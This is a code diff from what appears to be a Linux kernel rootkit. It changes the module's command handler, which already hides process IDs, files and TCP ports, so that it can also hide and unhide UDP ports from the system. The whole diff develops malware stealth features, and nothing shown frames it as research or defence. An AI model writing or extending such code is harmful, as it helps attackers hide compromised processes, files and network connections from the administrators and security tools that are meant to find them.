@@ -806,16 +806,26 @@ int execute_command(const char __user *str, size_t length)
         str += sizeof(CFG_UNHIDE_PID);
         pid_remove(str);
 	    
-    } else if (strcmp(str, CFG_HIDE_PORT) == 0) {
-        pr_info("Got hide port command\n");
-        str += sizeof(CFG_HIDE_PORT);
+    } else if (strcmp(str, CFG_HIDE_TCP_PORT) == 0) {
+        pr_info("Got hide tcp port command\n");
+        str += sizeof(CFG_HIDE_TCP_PORT);
 	hide_tcp4_port(str);
-        pr_info("str is: %s\n",str);
 	    
-    } else if (strcmp(str, CFG_UNHIDE_PORT) == 0) {
-        pr_info("Got unhide port command\n");
-        str += sizeof(CFG_UNHIDE_PORT);
+    } else if (strcmp(str, CFG_UNHIDE_TCP_PORT) == 0) {
+        pr_info("Got unhide tcp port command\n");
+        str += sizeof(CFG_UNHIDE_TCP_PORT);
         unhide_tcp4_port(str);
+	    
+	    
+    } else if (strcmp(str, CFG_HIDE_UDP_PORT) == 0) {
+        pr_info("Got hide udp port command\n");
+        str += sizeof(CFG_HIDE_UDP_PORT);
+	hide_udp4_port(str);
+	    
+    } else if (strcmp(str, CFG_UNHIDE_UDP_PORT) == 0) {
+        pr_info("Got unhide udp port command\n");
+        str += sizeof(CFG_UNHIDE_UDP_PORT);
+        unhide_udp4_port(str);
 	    
     } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
         pr_info("Got hide file command\n");
